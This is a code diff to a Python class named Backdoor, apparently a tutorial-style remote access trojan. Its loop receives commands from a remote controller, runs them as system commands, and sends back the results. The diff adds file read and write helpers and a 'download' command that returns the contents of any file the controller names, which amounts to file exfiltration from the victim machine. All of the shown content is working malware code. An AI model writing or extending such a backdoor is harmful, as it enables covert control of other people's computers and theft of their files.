@@ -27,6 +27,15 @@ class Backdoor:
     def change_working_directory_to(self, path):
         os.chdir(path)
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            print("reading "+path)
+            return file.read()
+
+    def write_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(content)
+
     def run(self):
         while True:
             command = self.reliable_receive()
@@ -36,6 +45,9 @@ class Backdoor:
             elif command[0] == "cd" and len(command) == 2:
                 self.change_working_directory_to(command[1])
                 command_result = "Changed directory to "+os.getcwd()
+            elif command[0] == "download":
+                #command_result="file content "+command[1]
+                command_result=self.read_file(command[1])
             else:
                 command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
